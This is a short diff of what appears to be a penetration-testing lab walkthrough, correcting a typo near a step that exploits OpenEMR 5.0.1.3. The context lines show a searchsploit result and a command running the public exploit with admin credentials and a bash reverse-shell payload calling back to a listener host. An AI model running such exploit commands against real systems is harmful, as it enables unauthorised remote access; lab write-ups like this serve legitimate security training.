@@ -141,7 +141,7 @@ $ searchsploit openemr 5.0.1
 ----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                 php/webapps/45161.py                                                                             | php/webapps/45161.py
 ```
-run get got the shell of www-data
+run and got the shell of www-data
 ```console
 $ python2 45161.py http://192.168.157.145/openemr -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.250/445 0>&1'
 
